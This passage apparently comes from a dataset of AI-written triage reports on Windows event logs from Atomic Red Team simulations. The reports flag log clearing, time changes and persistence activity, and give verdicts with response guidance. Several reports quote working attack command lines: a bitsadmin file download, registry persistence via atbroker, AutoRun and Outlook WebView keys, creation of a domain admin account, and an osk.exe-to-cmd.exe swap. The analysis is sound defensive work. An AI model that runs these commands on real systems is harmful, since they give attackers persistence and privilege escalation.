   - Event ID 4616 in the Security logs and similar entries in the System logs indicate that the system time was changed. While not malicious by itself, time changes can be used to manipulate timestamps of malicious activities.

4. **Execution of Tools and Commands:**
   - The execution of system tools such as `wevtutil.exe`, `whoami.exe`, and `hostname.exe` appears frequently and in close proximity to the creation of the new user and clearing of logs. 
   - The use of `wevtutil.exe` with commands like `cl` (clear) on various event logs is a strong indicator of log tampering.

#### Indicators of Malicious Activity or Compromise:

- The creation of an account with a non-standard name (`T1136.001_PowerShell`) via PowerShell and without a password is a classic indicator of malicious activity, aligning with MITRE ATT&CK technique T1136.001 (Create Account: Local Account).
- Clearing of event logs (System, Security, PowerShell) immediately following potential malicious activity execution points towards an attempt to obfuscate the trail of unauthorized access and usage.
- Privilege escalation noted in Event ID 4672, combined with the above actions, suggests an abuse of legitimate credentials (admin_test) to maintain persistent access and cover tracks.

### Assessment of the Situation:

The logs present a clear pattern of suspicious activities involving unauthorized account creation, log tampering, and privilege escalation. Given the evidence of user account creation using PowerShell, log clearing to hide traces, and use of administrative privileges, these activities align with tactics used in security compromises.

Bitsadmin Download (cmd),"After analyzing the provided event logs, here is a detailed assessment:

1. **Event Clearing Issue:**  
   - **Security, PowerShell, and System Log Clearance:**
     - The logs indicate that someone with admin_test credentials cleared the Security (EventID 1102), PowerShell, and System logs around the same time (`""2024-10-25 16:56:05.1001464""`) using `C:\Windows\System32\wevtutil.exe`.
     - Such activity is commonly used by attackers to cover their tracks. It is highly suspicious, especially when executed around the same time across critical logs.

2. **Suspicious Command Execution:**  
   - **Process of Particular Interest:** `""C:\\Windows\\System32\\cmd.exe""` executed a command to download a file using `bitsadmin.exe`. The command line for this is:
     ```shell
     ""cmd.exe"" /c bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %%
     temp%%\\bitsadmin1_flag.ps1
     ```
   - **Reason for Suspicion:**
     - `bitsadmin.exe` is a legitimate Windows tool but has been used in the past for malicious purposes, such as downloading malware due to its ability to perform file transfers in the background.
     - The URL involved in the command directs to a GitHub repository known to host red team tools, indicating possible simulation of or genuine malicious activity.

3. **Process Execution by Admin User:**  
   - Multiple instances of `wevtutil.exe` were run by the `admin_test` user to clear not just event logs but also using specific channels like `Sysmon`, `System`, `Application`, and `Windows PowerShell`.
   - This shows an intentional action to hide activities and suggests organized steps to cover operations that potentially compromised host integrity.

4. **Execution of Legitimate System Tools:**  
   - Tools like `whoami.exe` and `hostname.exe` were executed during this timeframe. Although legitimate, their use can indicate enumeration activities typical of intrusions or internal navigation by attackers.

### Conclusion:
Given the nature of the activities—especially the clearing of logs using a known method to evade detection, and suspicious downloading of a script using `bitsadmin.exe`—these logs indicate likely malicious behavior.

Office Application Startup - Outlook as a C2,"Based on the provided Windows event logs, I've analyzed key events and identified indicators of potentially malicious activity. Here is the analysis:

### Analysis:

1. **Security Log - Event ID 1102: Log Cleared**
   - The security log shows an event with EventID 1102 indicating that logs were cleared by the user `admin_test`. Clearing logs is often an attempt to cover tracks and is generally considered suspicious behavior unless explicitly justified in documented administrative actions.

2. **Security Log - Event ID 4616: System Time Changed**
   - There are multiple EventID 4616 entries indicating changes in system time. This can be used by an attacker to alter timestamps on various activities, making it difficult to track actions in logs. The involvement of the `svchost.exe` process under `LOCAL SERVICE` is worth noting, although not inherently malicious alone.

3. **Sysmon Logs - Usage of `wevtutil.exe`**
   - Multiple Sysmon events indicate the execution of `wevtutil.exe` with arguments likely related to clearing logs, such as clearing `Microsoft-Windows-Sysmon/Operational`, `System`, `Application`, `Security`, and `Windows PowerShell` channels, all performed by `admin_test`. This points to an attempt to erase footprints from various log channels.

4. **Sysmon Log - Unusual Command Execution**
   - `cmd.exe` is executed with a command that involves registry modification (`reg add`) and file creation (`echo ""Atomic Red Team TEST""`). This includes the creation of potentially malicious or test files in the user's Outlook system folder. The combination of registry manipulation and unauthorized file operations can signify a breach or simulation test (e.g., from `Atomic Red Team`).

5. **System Log - Event ID 104: Log Cleared**
   - Consistent with security findings, the system log shows entries for EventID 104 with logs being cleared by the same user `admin_test`.

### Assessment:

- **Suspicious Behavior:**
  - The key activities of concern are the clearing of logs, changes in system time, and execution of commands that manipulate system registry settings and manage unauthorized files. These actions are characteristic of efforts to compromise a system while evading detection.

### Resolution:

- **SUSPICIOUS:**
  - The activities logged contain behavior consistent with both potentially malicious activity and red team simulation techniques. However, without further context (such as evidence of administrative tasks, simulation exercises documented, etc.), it is not definitively malicious but requires further investigation.

### Guidance:

1. **Investigate User Activity:**
   - Review the legitimacy of `admin_test` actions. Check whether these actions were part of administrative operations or authorized testing, such as a red team exercise.

2. **Audit System Integrity:**
   - Conduct a thorough system integrity check, focusing on changes to critical system configurations and unauthorized registry modifications.

3. **Review Network Traffic:**
   - Analyze network traffic logs for any indicators of data exfiltration or command and control communications corresponding to the timeline of these events.

4. **Enhance Monitoring:**
   - Increase the monitoring capabilities around the use of `wevtutil.exe`, `cmd.exe`, and time changes, possibly incorporating alerts for unusual spikes in such activity.

By taking these steps, you can determine if this was benign simulation, internal malpractice, or an actual external compromise."

   - EventID 104 (System), EventID 1102 (Security): Multiple log clearing events are by user `admin_test`, observed at `13:54:23` for the System, Windows PowerShell, and Security logs respectively. Clearing logs is a common practice by attackers to cover their tracks after performing malicious actions.

2. **Command Execution with Elevated Privileges:**
   - `cmd.exe`: A command was executed at `13:54:17` with a series of actions aimed at replacing the `osk.exe` (On-Screen Keyboard) with `cmd.exe`. This type of action is indicative of a known privilege escalation technique (utilizing accessibility features to gain a command shell with elevated permissions).
   - The command involved taking ownership and granting full permissions to `osk.exe`, deleting it, and creating a symbolic link to `cmd.exe`.

3. **Use of Administrative Privileges:**
   - EventID 4672 (Security): The `admin_test` user was granted special privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, `SeSecurityPrivilege`, indicating elevated capabilities at `13:54:17`.

4. **Use of wevtutil for Clearing Logs:**
   - Multiple executions of `wevtutil.exe` to clear logs (`cl` command) for various event channels (Sysmon/Operational, Application, Security) are found. This utility is often used by attackers to delete specific event logs.

5. **Time Tampering:**
   - EventID 4616 (Security): There are events showing changes to the system time from `2024-10-27 13:54:24` back to `2024-10-27 13:54:16`. Such actions can be used to manipulate timestamps of further log entries.

6. **Execution of Hostname and Whoami:**
   - Frequent execution of `hostname.exe` and `whoami.exe` under high integrity level by `admin_test`, which might suggest automated scripts or processes conduct reconnaissance activities on the system.

### Assessment:
- The presence of log clearing, use of `wevtutil` to explicitly clear logs, suspicious command execution attempting privilege escalation, and time manipulation are strong indicators of malicious activity.
- The user `admin_test` is associated with potentially harmful actions, combining actions seen in the Sysmon and Security log entries.

### Resolution:
- **MALICIOUS:**
  - The activities observed raise significant concerns of a possible compromise involving privilege escalation and evidence destruction attempts. These are common characteristics found during and post-intrusion to maintain persistence or hide traces of actions taken on an endpoint.

### Guidance:
- **Immediate Actions:**
  - Isolate the affected system (Server002) from the network to prevent potential lateral movement.
  - Initiate a thorough forensic analysis to capture volatile data and confirm any unauthorized changes.
  - Reset credentials and review permissions for `admin_test` and related privileged accounts.
- **Preventive Measures:**
  - Implement monitoring solutions for detecting log clearing attempts and time manipulations.
  - Educate administrators on recognizing signs of compromise and encourage regular security training.
  - Evaluate and enhance current logging and alerting solutions to identify suspicious behavior proactively."
Netsh Helper DLL Registration,"Based on the provided Windows event logs for ""Server002"", here's a detailed analysis:

### Suspicious Activities:

1. **Log File Clearing:**
   - **System, Security, and Windows PowerShell logs were cleared** (EventIDs 104 and 1102 are log clearance events):
     - **Time:** 2024-10-27 13:43:45
     - **User:** `SERVER002\admin_test`

   This is a major red flag. Log file clearing is often an indication of a malicious actor trying to cover their tracks.

2. **Abnormal Command Execution:**
   - **Cmd.exe and PowerShell Activity:** Several `Sysmon` logs indicate execution of suspicious command lines under the user `admin_test`. This includes:
     - **Execution of wevtutil.exe**: Used for clearing logs (`cl` command in the command line indicates clearing of specific event logs).

3. **Usage of Suspicious DLLs:**
   - There is a **suspicious command execution** with `cmd.exe` attempting to add a helper DLL (`NetshHelper.dll`) via `netsh.exe`. This activity is associated with a known attack technique used by malware (T1546.007 - Event Triggered Execution: Netsh Helper DLL).

4. **Execution of Common Administrative Commands:**
   - Commands like `whoami.exe` and `hostname.exe` are commonly used by attackers for recon or privilege escalation purposes.

### Indicators of Compromise:

- **Log Cleaning Behavior**: The deliberate clearing of logs for System, Security, and PowerShell is often indicative of post-exploitation cleanup.
- **Execution of Malicious Scripts**: The command sequence that involves loading a potential malicious DLL and task killing processes, such as Notepad.exe, aligns with adversarial tactics.
- **Abnormal User Behavior**: The consistent use of the `admin_test` account for these actions is unusual and needs further investigation to confirm legitimacy.

### Assessment:

Given the detailed log entries, the activities on `Server002` strongly indicate malicious behavior. The combination of log clearance, unauthorized command execution, and suspicious DLL use suggests an active compromise by a potential threat actor.

### Resolution:
- **Resolution: MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Response Actions:**
   - Isolate `Server002` from the network to prevent further compromise or lateral movement.
   - Alert the security operations center (SOC) for immediate containment and investigation.

2. **Forensic Investigation:**
   - Perform a complete forensic analysis on `Server002` to determine the full scope and origin of the compromise.
   - Retrieve any available system snapshots, network logs, and memory dumps for deeper analysis.

3. **Threat Hunting & Monitoring:**
   - Review other systems for similar indicators, especially those with administrative privileges.
   - Increase monitoring for unusual activities, specifically around log clearance and unauthorized admin command execution.

4. **User Account Management:**
   - Verify `admin_test` account activity, reset credentials, and enforce multi-factor authentication.
   - Audit privileged accounts and their usage patterns across the network.

5. **System Patching & Hardening:**
   - Ensure all systems, including `Server002`, are patched for known vulnerabilities.
   - Apply best security practices and configure systems to log PowerShell and administrative activities.

By following these steps, the organization can effectively manage and mitigate the identified threats while strengthening its security posture against future incidents."
Atbroker.exe (AT) Executes Arbitrary Command via Registry Key,"### Analysis of Logs

Upon analyzing the provided logs, there are several key observations that indicate potential malicious activity:

1. **Log File Clearing**:
   - The logs reveal multiple instances of the `wevtutil.exe` being executed with the intention to clear event logs:
     - `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`
     - `wevtutil.exe cl Application`
     - `wevtutil.exe cl System`
     - `wevtutil.exe cl ""Windows PowerShell""`
   - These commands are executed by the user `admin_test`, indicating an attempt to cover tracks or erase evidence of activities on the system.

2. **Registry Modifications and Command Execution**:
   - A `cmd.exe` process is observed executing a series of registry modifications:
     ```plaintext
     ""cmd.exe"" /c reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test"" /f & reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test"" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0 /f & reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test"" /v StartEXE /t REG_SZ /d C:\WINDOWS\system32\cmd.exe /f & atbroker /start malware_test
     ```
   - This indicates a potential attempt to set persistence using Windows Accessibility features (a known method to execute malicious software with elevated privileges).

3. **Time Manipulation**:
   - Time being set back was observed: 
     - `EventID: 4616` showing the previous time as `2024-10-27 13:58:01.2562482` and new time as `2024-10-27 13:57:55.0668763`.
   - This activity suggests an attempt to manipulate system time potentially to mislead log timelines or alter timestamps on evidence.

4. **Execution of `whoami.exe` and `HOSTNAME.EXE`**:
   - While `whoami.exe` and `hostname.exe` are legitimate tools, the context of their execution along with the clearing of logs and registry modifications with the same user account can be suspicious.

5. **Privileged User Involvement**:
   - Events are consistently performed under the user `SERVER002\admin_test`, with high integrity level, suggesting an insider threat or compromised privileged account.

### Assessment of Situation

The activities observed in the logs, including the clearing of event logs (`wevtutil` usage), manipulation of the system registry, time manipulation events, and the use of system utilities to obfuscate logs, strongly suggest deliberate actions to conceal potential unauthorized or malicious activities. The behaviors align with typical actions performed by adversaries aiming to gain persistent access and avoid detection on a compromised system.

### Recommended Actions

- Immediately investigate the `SERVER002\admin_test` account for unauthorized activities or compromises. This includes checking recent login logs and any other associated activities with this account.
- Review any alerts or incidents related to `wevtutil.exe` usage across other systems to determine if this is isolated or part of a broader incident.
- Conduct a full malware scan on the system and potentially involved processes or scripts.
- Enforce stricter logging policies and system integrity monitoring to track and alert on similar activities.
- Depending on the outcome, communication with legal and management teams may be necessary if an insider threat is identified.

### Final Resolution

**MALICIOUS** - The logs exhibit clear signs of potential malicious activity or compromise."
COM hijacking via TreatAs,"The provided logs indicate several activities worth noting for suspicious and potentially malicious behavior:

1. **PowerShell and Registry Modifications**: 
   - The PowerShell logs show a script modifying Windows Registry entries, specifically entries under `HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest`. This script leverages a variety of CLSID (Class ID) manipulations and sets InprocServer32 to `C:\WINDOWS\system32\scrobj.dll`. Such registry modifications are typically associated with COM hijacking, often used to maintain persistence or load malicious components.
   - The script further modifies the registry to include references to an external Scriptlet URL hosted on GitHub, which could potentially download and execute remote code.

2. **Use of Rundll32.exe**:
   - There is a command execution using `rundll32.exe`, a common technique used by attackers to execute code via DLLs. In this case, `rundll32.exe` is invoked with an argument referencing the ""AtomicTest"" object, which is suspicious given the context of registry modifications done prior to this action.

3. **Logs Cleared**: 
   - The system, PowerShell, and security event logs were cleared soon after these actions were performed, which is a strong indicator of an attempt to cover tracks. Log clearing can be suspicious when not part of regular maintenance activities. The logs were cleared by a user `admin_test`, suggesting the involvement of higher privileges.

4. **Process Execution**:
   - The Sysmon logs indicate multiple system processes were modified or executed (`wevtutil.exe`, `rundll32.exe`, `reg.exe`) in short succession, all tied back to the user `SERVER002\admin_test`. This account's activity aligning closely with system changes raises suspicion.

5. **Time Change**:
   - There are entries suggesting time changes on the system through `svchost.exe`. Time manipulation is often used to disrupt log analysis or detection mechanisms.

Overall, considering these factors, the behavior observed in the logs is highly consistent with typical adversary tactics, techniques, and procedures (TTPs), such as persistence mechanisms, potential for remote code execution, and covering of tracks through log manipulation.

**Resolution**: **MALICIOUS**

**Guidance**:
1. **Immediate Containment**: Disconnect the affected system (Server002) from the network to prevent further spread or attack.
2. **Investigation and Remediation**:
   - Analyze the user account `admin_test` for unauthorized activity or compromise.
   - Examine external artifacts, such as the referenced Scriptlet URL, to understand potential payloads or backdoors.
   - Check the affected machine for additional signs of compromise, such as unusual network connections, file integrity changes, and additional modified registry keys.
   - Backup existing logs and other system state information for post-incident analysis.
3. **Security Enhancement**:
   - Implement enhanced monitoring and alerting on PowerShell and registry activities.
   - Regularly train users on security best practices and update access controls to minimize exposure.
4. **Incident Reporting**: Report the incident following your organizational protocols to ensure compliance and awareness."
Adding custom debugger for Windows Error Reporting,"Upon analysis of the provided logs, several events stand out that indicate potential malicious activity or compromise on the system ""Server002"":

### Suspicious or Anomalous Behaviors:
1. **Event Log Clearing**:
    - Multiple log clear events are observed in both the System and Security logs. The clearing of logs (EventID 104 for System and EventID 1102 for Security) were conducted by the user ""admin_test"". This is suspicious as attackers often clear event logs to erase traces of their activities.

2. **Process Execution**:
    - There are multiple instances of the `wevtutil.exe` process being executed (Sysmon EventID 1) for clearing logs from various channels such as Microsoft-Windows-Sysmon/Operational, Application, ""Windows PowerShell"", and System. Such commands are often used as part of an attack chain to hide tracks.

3. **Registry Modification via Command Line**:
    - An instance of `cmd.exe` executing a potentially malicious registry modification is observed:
      ```
      ""cmd.exe"" /c reg add ""HKLM\Software\Microsoft\Windows\Windows Error Reporting\Hangs"" /v Debugger /t REG_SZ /d ""C:\Windows\System32\notepad.exe"" /f
      ```
      This command modifies a registry key for error reporting, redirecting it to open `notepad.exe` instead of error-reporting applications, which is often a tactic used by attackers to evade detection or subvert system monitoring.

4. **High Integrity Level Executions**:
    - Processes such as `cmd.exe` and `wevtutil.exe` are running with high integrity levels, typically requiring elevated privileges. The combination of high integrity level access and malicious command lines enhances the risk of privilege escalation or system compromise.

5. **Multiple Instances of WHOAMI and HOSTNAME Executions**:
    - The frequent execution of `whoami.exe` and `hostname.exe` could indicate a reconnaissance stage of an attack, where an attacker is gathering information about the system and the current user context.

### Indicators of Malicious Activity:
- The deliberate and multiple clearing of logs, especially the Security log, and the execution of registry modifications under high integrity level, strongly indicate attempts to cover up malicious activity.
- The consistent use of system utilities (`wevtutil.exe`, `cmd.exe`) for non-standard operations points towards actions usually not performed by legitimate users.

### Assessment:
The activities in the logs reflective of:
- Log tampering and clearing.
- Command-line usage for unauthorized registry changes.
- Abnormal use of system utilities.
These are clear indicators of malicious behavior.

### Resolution: MALICIOUS

### Recommended Actions:
- **Immediate Review and Isolation**: Isolate the affected system to prevent further potential breach.
- **Incident Response**: Engage the incident response team to investigate the broader impact and sources further.
- **Forensic Analysis**: Conduct in-depth forensic analysis to determine the extent of the compromise and identify any other malicious payloads or backdoors.
- **Patch and Update**: Ensure the system and its applications are fully patched and updated.
- **User Training and Policy Enforcement**: Reinforce security policies and user training to avoid similar occurrences in the future."
Powershell Execute COM Object,"Based on the provided logs, the analysis reveals the following suspicious and potentially malicious activities:

1. **Log Tampering:**
   - Multiple logs from the Security and System channels have been cleared (`EventID: 1102` in the Security log, and `EventID: 104` from the System log). This is a serious indicator of someone attempting to cover up malicious activity by deleting event logs. The user account used was `""SERVER002\\admin_test""`.

2. **Privilege Escalation:**
   - The user `""admin_test""` is observed with a `4672` event indicating that special privileges were assigned. These privileges include `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc., which are typically not needed for a regular user account and can indicate an attempt at privilege escalation.

3. **Suspicious PowerShell Activity:**
   - There is a PowerShell script execution that is using `ShellExecute` via the Component Object Model (COM) object to run `cmd.exe` and subsequently `calc.exe`. The obfuscation and use of the COM object to execute a shell command are common indicators of malicious activity.

4. **Process Creation:**
   - The logs indicate numerous executions of `wevtutil.exe`, which is a utility for managing event logs, including clearing or exporting logs. Coupled with cleared logs in the Security and System channels, this suggests attempts to hide traces of activities.

In summary, the combination of the altered logs, elevated privileges being granted, and the execution of an obfuscated PowerShell script strongly point toward malicious activity. The user account `""admin_test""` is of particular interest and should be thoroughly investigated.

### Assessment:
- **Resolution:** MALICIOUS

### Recommendations for Response:
1. **Immediate Incident Response:**
   - Isolate the system (Server002) from the network to prevent any further potential lateral movement or data exfiltration.
   - Preserve the current state of the system with a forensic image for further analysis.

2. **Investigation:**
   - Analyze the login activities and network connections related to the `""admin_test""` account.
   - Review other systems for similar activities, suspicious logins, or anomalies that could indicate a broader compromise.

3. **Remediation:**
   - Reset credentials and review permissions for the compromised accounts.
   - Identify and patch vulnerabilities that may have allowed the compromise.

4. **Monitoring and Detection:**
   - Implement additional monitoring of sensitive accounts and log-clearing operations.
   - Review and enhance existing security tools and policies to detect similar activities in the future.

5. **Notification:**
   - Inform relevant stakeholders and, if necessary, legal authorities in accordance with data breach policies and local laws."
Registry key creation and-or modification events for SDB,"Upon analysis of the provided Windows event logs, several points of interest were identified that may indicate suspicious or potentially malicious activities:

1. **Log Clearing Evidence:**
   - There are events indicating that logs were cleared. Logs being cleared can often be an attempt to cover tracks by a malicious actor. This is seen in the System logs with Event ID 104, where `admin_test` cleared logs from the ""System"" and ""Windows PowerShell"" channels, and in the Security logs with Event ID 1102 which shows log clearing.

2. **PowerShell Execution:**
   - The PowerShell logs indicate the execution of a command related to Atomic Red Team tests, which are often used by red teams and potentially adversaries to simulate attack techniques. This specific command modifies registry keys related to Windows AppCompat flags.
   - The command executed is: 
     ```powershell
     New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Custom -Name ""AtomicRedTeamT1546.011"" -Value ""AtomicRedTeamT1546.011""
     ```

3. **Service and Time Changes:**
   - There are multiple instances of the ""edgeupdate"" service stopping, which, if unexpected, could be a sign of an attempted persistence mechanism disruption.
   - Security logs show time manipulation (Event ID 4616) with changes in system time, which can be used to disrupt logs correlation and temporal analysis of events.

4. **High Integrity Process Executions**:
   - Analysis of Sysmon logs shows processes like `wevtutil.exe` being executed, which is a standard utility for clearing event logs and could be tying into the aforementioned event clearing activities.
   - The use of high-integrity level processes could point to privilege escalation attempts or use of previously gathered privileges (e.g. `SeDebugPrivilege` detected in Event ID 4672).

5. **Impersonation and Privilege Escalation:**
   - The Security logs list Event ID 4672, which is a privileged operation initiated by `admin_test` suggesting possible use of administrative rights or impersonation for log clearing and registry changes.

**Guidance:**
- Immediately investigate the actions and recent activities of the user `admin_test` to verify if these operations were legitimate or necessitate further inquiry.
- Cross-verify the usage of PowerShell and ensure compliance with organizational policy regarding such scripts. Look for signs of unauthorized routines especially adding unusual registry keys.
- Monitor for further use of high-integrity tools and track Sysmon events for unusual processes and command line usage.
- Increase scrutiny on the machine and user accounts involved; consider additional endpoint detection and response (EDR) rules for future logging and alerting.
- Restore system times if impacted and ensure the time synchronization settings are correctly configured.

**Final Assessment: SUSPICIOUS**

The activities seen in the logs, including log clearing, privilege escalations, and execution of unusual PowerShell commands, necessitate further investigation to determine the intent and potential compromise level."
Create a new Windows domain admin user,"Upon analyzing the provided Windows event logs, several indicators suggest malicious activity related to unauthorized access and potential compromise on the host system, specifically on ""Server002"". Below is a detailed breakdown of the findings:

1. **Event Log Clearing:**
   - Multiple instances of clearing logs are observed, as indicated by the wevtutil (Windows Events Command Line Utility) process being executed multiple times with commands related to clearing logs (`wevtutil.exe cl <log>`) for Application, System, and Security logs. This is usually an attempt to cover tracks after malicious activity.
   - Event ID 1102 in the Security log corresponds to ""The audit log was cleared,"" initiated by the user ""admin_test,"" further supporting tampering with log files.

2. **Process Execution and Commands:**
   - The process `cmd.exe` executed with a suspicious command line: `""cmd.exe"" /c net user ""T1136.002_Admin"" ""T1136_pass123!"" /add /domain & net group ""Domain Admins"" ""T1136.002_Admin"" /add /domain`.
   - This command sequence essentially adds a user with administrative privileges, which is a known technique (T1136.002 - Create Account) used by threat actors to maintain access and elevate privileges.
   - The creation of a potentially unauthorized high-privilege user indicates a severe compromise.

3. **Privilege Escalation Activities:**
   - An unusual combination of privileges is assigned to the user ""admin_test,"" including SeDebugPrivilege and SeTakeOwnershipPrivilege, which are typically associated with administrative tasks but can be abused for illicit purposes.
   - The high integrity level and elevated token settings used during the logon sessions corroborate unauthorized privilege escalation.

**Assessment:**
The logs indicate unauthorized log clearing activities and creation of a high-privileged domain admin account using the ""admin_test"" user, which includes potential privilege escalation and establishment of persistence. Combined, these signals strongly point toward malicious intent.

**Resolution: MALICIOUS**

**Guidance:**
- Immediate response actions are necessary to secure the network:
  - Disconnect ""Server002"" from the network to prevent further unauthorized actions.
  - Conduct a comprehensive forensic investigation to assess the scope and impact of the breach.
  - Revoke the unauthorized account and review all accounts and privileges for signs of compromise.
  - Investigate potential points of entry and update security measures to prevent similar future incidents.
  - Consider engaging with incident response professionals to ensure thorough mitigation and security reinforcement."
HKLM - Persistence using CommandProcessor AutoRun key (With Elevation),"**Detailed Analysis of the Logs:**

1. **Registry Manipulation via PowerShell:**
   - A PowerShell command was executed to create a new registry entry under `HKLM:\Software\Microsoft\Command Processor` with the name ""AutoRun"" and value ""notepad.exe"". This type of action can be used to achieve persistence, as it sets a command to run each time the command prompt starts, which is a common tactic in attack scenarios.
   - **Logs:** Detected in Sysmon and Windows PowerShell logs.

2. **Event Log Clearing:**
   - The security and system event logs on `Server002` were cleared. Log clearing is a method used to hide tracks from system audits and investigations. The action was performed by the user ""admin_test"".
   - **Logs:** Detected in Security and System logs (EventID 1102 for Security and EventID 104 for System).

3. **Time Change Events:**
   - Multiple events indicate that the system time was altered. Altering system time can be malicious as it could interfere with time-based security mechanisms and log integrity.
   - **Logs:** Multiple entries in the Security and System logs from `svchost.exe`.

4. **Execution of Sysmon-monitored Processes:**
   - Processes like `whoami.exe`, `wevtutil.exe`, and `conhost.exe` were executed frequently. While execution of these commands individually is not unusual, the context—especially the frequent usage and the association with log clearing—could indicate malicious activity aiming for reconnaissance and log manipulation.

5. **Edge Update Activity:**
   - There are multiple entries for processes related to Microsoft Edge updating or installing, such as `MicrosoftEdgeUpdate.exe`. The activities observed do not directly look suspicious; however, they are common in scenarios where a legitimate updater is manipulated for persistence or lateral movement.

**Assessment of the Situation:**
- The presence of registry manipulation, event log clearing, and execution of system time modifications, backed by suspicious PowerShell activity, all suggest behavior that could be classified under ""living off the land"" tactics. Such tactics involve using legitimate tools and operations in unexpected ways to perform malicious actions while blending in with expected activity.

**Threats or Risks Identified:**
- **Persistence:** Registry modifications for AutoRun may allow automatic code execution for future sessions.
- **Evidence Tampering:** Clearing event logs indicates an attempt to remove traces of activities from the logs, suggesting post-activity cleanup efforts.
- **Potential Reconnaissance and Lateral Movement:** The execution of `whoami.exe` could be indicative of an attacker collecting information and possibly looking to escalate privileges or move within the network.

**Guidance on How to Proceed:**
1. **Investigate PowerShell Activity:**
   - Verify if the registry entry was legitimately created.
   - Check for any recent changes by users or administrators that could explain this behavior.

2. **Review User Activity:**
   - Investigate the user ""admin_test"" to understand if this action aligns with past behaviors and roles.

3. **Monitor or Isolate the Host:**
   - Consider increasing monitoring on the host for further suspicious activities.
   - Depending on findings, isolate the system to prevent any potential lateral movement.

4. **Coordinate With IT/InfoSec:**
   - Discuss findings with IT and security teams to assess the legitimacy of these actions and review potential breach indicators.

**Final Resolution:** **MALICIOUS** - Based on log-clearing, registry manipulation recognizing persistency signs, and potential evasion tactics all lead to high confidence in malicious activity. Immediate response and investigation are warranted."
Change Default File Association,"### Detailed Analysis of the Logs

#### **Suspicious and Anomalous Behavior**

1. **Security Log 1102 Event - Log Clearance:**
   - The log entry with `EventID: 1102` in the Security log indicates that the log was cleared. The user responsible, `admin_test`, cleared the logs. An event like this is an immediate red flag as attackers often clear logs to hide their tracks after a compromise. 

2. **Sysmon Log - `wevtutil.exe` Usage:**
   - Multiple uses of `wevtutil.exe` were observed under the user `admin_test`. The command `wevtutil cl Security` was executed, which is used to clear the security logs. This action, combined with the Security `1102` event, indicates a deliberate attempt to cover tracks.
   - The `wevtutil.exe` command was also used to clear the `System`, `Application`, and `Windows PowerShell` event logs. This widespread clearing of logs further suggests malicious intent.

3. **Suspicious Command Execution:**
   - Command execution using `whoami.exe` and `hostname.exe` was seen. While these by themselves are not always indicative of malicious activity, they were surrounded by suspicious activity (e.g., log clearing) that heightens their concern.
   - The execution of `cmd.exe` with the command `""cmd.exe"" /c assoc .hta=txtfile` which appears to change file associations for `.hta` files to `txtfile`. This could be an obfuscation or evasion technique.

4. **Frequent Use of Administrative Privileged Tools:**
   - The use of tools generally requiring administrative privileges, like `wevtutil.exe` and clearing logs, within a short time frame in a high integrity context (as `admin_test` user).

#### **Analysis and Assessment**

- **Indicators of Malicious Activity:**
  - The use of `wevtutil.exe` to clear event logs is strong evidence of malicious activity.
  - The `1102` event, which denotes cleared security logs, aligns suspiciously with the execution of `wevtutil.exe`.
  - The environment's utilization of built-in utilities (`cmd.exe`, `whoami.exe`, `hostname.exe`) could indicate initial reconnaissance or configuration changes often related to adversarial actions.
  - Combined use of system utilities to clear logs, paired with unusual command-line operations, indicate a coordinated attempt to perform unauthorized operations while staying undetected.

### Threats, Risks, and Guidance

- **Threats:**
  - The main threat is the potential unauthorized access leading to data exfiltration, persistence mechanisms, or any further malicious administrative actions left unnoticed due to log clearance.
  
- **Risks:**
  - Compromise of user credentials and potential lateral movement in the network.
  - Undetected malicious activity due to cleared logs can leave the system vulnerable to further exploitation and make post-incident analysis challenging.

- **Guidance:**
  1. **Immediate Actions:**
     - Conduct a full security assessment of `Server002`.
     - Check for additional Indicators of Compromise (IOCs) tied to the `admin_test` account.
     - Isolate the host if other affirmative signs of compromise are found.
  
  2. **Further Investigation:**
     - Investigate other hosts for similar activities.
     - Review EDR logs and other sources for potential data exfiltration or command and control activities.

  3. **Remediation:**
     - Update system patches and review user privileges to ensure only necessary permissions.
     - Enhance logging and monitoring to alert on future unauthorized log clearing attempts.

### Resolution

Based on the analysis provided, the resolution is **MALICIOUS**, as the activity observed reflects actions that are consistent with an attempt to hide malicious behavior on the system."
Install Outlook Home Page Persistence,"Upon reviewing the provided event logs from the Windows host, several key observations can be made, especially focusing on the sequence and nature of activities around the time of the alert triggered on the CEO machine:

### Key Observations:

1. **Clearing of Event Logs**:
   - The `System`, `Security`, and `Windows PowerShell` logs were cleared by the user `admin_test` shortly before the suspicious activity. These events are documented by Event ID 104 in the System log and Event ID 1102 in the Security log. Clearing event logs can be an indicator of an attempt to cover tracks after malicious activity.

2. **Process Execution with `wevtutil`**:
   - The Sysmon log details multiple executions of `wevtutil.exe`, a tool that can be used to query, back up, or clear logs. It is noted being used to clear logs in several entries such as `""C:\\Windows\\system32\\wevtutil.exe\"" cl Application"", ""cl System"", ""cl Windows PowerShell""`. This activity is consistent with the log entries being cleared.

3. **Suspicious Command Execution**:
   - A command was executed via `cmd.exe` that involved modifying the registry, particularly adding a registry key associated with Outlook WebView. This command is as follows:
     ```
     cmd.exe /c reg.exe add HKCU\Software\Microsoft\Office\16\Outlook\WebView\Inbox /v URL /t REG_SZ /d file://C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1137.004\src\T1137.004.html /f
     ```
   - This registry modification is not typical for standard operations, indicating potentially malicious intent (e.g., persistence, exploitation of Outlook vulnerabilities).

4. **Use of High Integrity Level**:
   - Many processes are running with high integrity level, including those involved in log manipulation and registry modifications, which suggests potential unauthorized actions using elevated privileges.

5. **Tools for Reconnaissance**:
   - Tools like `whoami.exe` and `hostname.exe` are executed, which are often used to gather information about the system environment, although these alone are not inherently malicious.

### Assessment:

The combination of event log clearing, suspicious command-line activity involving registry modifications, and the use of potentially high-integrity operations point towards unauthorized or malicious activity. The presence of `AtomicRedTeam` in the filesystem path indicates possible use of red teaming tools or scripts, potentially for simulated attack testing or exploitation.

### Conclusion: MALICIOUS

